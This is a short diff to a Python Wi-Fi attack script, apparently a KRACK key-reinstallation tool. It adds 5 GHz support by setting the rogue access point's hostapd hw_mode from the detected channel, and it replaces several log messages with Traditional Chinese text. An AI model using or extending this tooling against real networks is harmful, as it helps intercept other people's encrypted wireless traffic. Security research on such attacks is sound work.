@@ -27,6 +27,7 @@ class NetworkConfig():
 		self.akms = set()
 		self.wmmenabled = 0
 		self.capab = 0
+		self.hw = 'g'
 		
 	# 檢查 beacon frame MAC層是否包含RSNE訊息，沒有就代表非使用RSN網路(為WEP)
 	def is_wparsn(self):
@@ -97,7 +98,7 @@ rsn_gtksa_counters={gtksa_counters}
 
 wmm_enabled={wmmenabled}
 wmm_advertised={wmmadvertised}
-hw_mode=g
+hw_mode={hw}
 auth_algs=3
 wpa_passphrase={password}"""
 		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
@@ -115,6 +116,7 @@ wpa_passphrase={password}"""
 			gtksa_counters = (self.capab & 0b110000) >> 4,
 			wmmadvertised = int(args.group),
 			wmmenabled = self.wmmenabled,
+			hw = self.hw,
 			password = str(args.password))
 
 class ClientState():
@@ -593,10 +595,11 @@ class KRAckAttack():
 		self.netconfig = NetworkConfig()
 		self.netconfig.from_beacon(self.beacon)
 		if not self.netconfig.is_wparsn():
-			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
+			log(ERROR, "裝置目前連接的網路，使用 WEP 協議。")
 			return
 		elif self.netconfig.real_channel > 13:
-			log(WARNING, "Attack not yet tested against 5 GHz networks.")
+			self.netconfig.hw = 'a'
+			log(WARNING, "偵測到裝置目前連接之網路為 5G 網路，請確保所使用的 rouge_ap 網卡為支援 5G 網路之網卡。")
 		self.netconfig.find_rogue_channel()
 		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
 		self.sock_real.set_channel(self.netconfig.real_channel)
